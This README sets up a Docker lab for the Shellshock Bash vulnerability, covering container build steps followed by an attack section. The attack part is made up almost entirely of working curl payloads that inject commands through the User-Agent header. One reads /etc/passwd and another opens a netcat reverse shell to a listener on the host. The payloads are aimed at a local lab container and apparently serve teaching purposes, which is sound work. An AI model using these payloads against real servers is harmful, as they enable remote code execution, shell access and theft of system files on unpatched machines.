
# Shellshock

CentOS8 + Apache2 + Bash (v4.3) based on https://github.com/tex2e/docker-shellshock-cgi

Requirements:
- Docker
- git
- netcat command

### Build
1. command: $git clone https://github.com/juuugee/docker-shellshock-cgi.git
2. navigate to the git directory
3. command: $docker build -t seccode/shellshock <**absolute Path to the directory**>
4. command: $docker run -itd -p 80:80 --privileged --add-host=host.docker.internal:host-gateway --name secode_shellshock seccode/shellshock /sbin/init

### Attack (Linux terminal preferred)
Get the Information out of **etc/passwd** <br>
curl：
```bash
curl -A "() { :;}; echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://localhost:80/cgi-bin/test.cgi
```
#
Create a Reverse Shell 2 Terminals required <br>
1. Terminal (Start nc Listener):
```
nc -lp 4545
```
2. Terminal (Establish a connection via Shellshock vulnerability):
```
curl -A "() { :;}; /bin/bash -c \"nc host.docker.internal 4545 -e /bin/bash\"& " http://localhost:80/cgi-bin/test.cgi
```

Go to the first terminal and use the **reverse shell**: </br>
For example, read the rights of the shell:  

### See Also

- [mubix/shellshocker-pocs: Collection of Proof of Concepts and Potential Targets for #ShellShocker](https://github.com/mubix/shellshocker-pocs)
- [docker-shellshockable/Dockerfile at master · Zenithar/docker-shellshockable](https://github.com/Zenithar/docker-shellshockable/blob/master/Dockerfile)
